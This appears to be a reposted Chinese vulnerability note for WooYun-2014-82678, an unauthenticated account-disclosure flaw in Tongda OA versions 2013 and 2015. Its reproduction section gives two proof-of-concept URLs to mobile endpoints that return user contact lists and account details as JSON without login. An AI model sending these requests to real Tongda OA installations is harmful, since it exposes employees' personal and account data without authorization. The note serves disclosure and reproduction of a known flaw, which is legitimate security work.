# （WooYun-2014-82678）通达oa未授权获取帐号

> 原文：[https://www.zhihuifly.com/t/topic/3332](https://www.zhihuifly.com/t/topic/3332)

# （WooYun-2014-82678）通达oa 未授权获取帐号

## 一、漏洞简介

无需登录，即可获取所有信息

## 二、漏洞影响

2013、2015版本

## 三、复现过程

POC:

```
http://0-sec.org/mobile/inc/get_contactlist.php?P=1&KWORD=%&isuser_info=3 
```

```
http://0-sec.org/mobile/user_info/data.php?P=1&ATYPE=getUserInfo&Q_ID=50 
```

将返回的json进行解码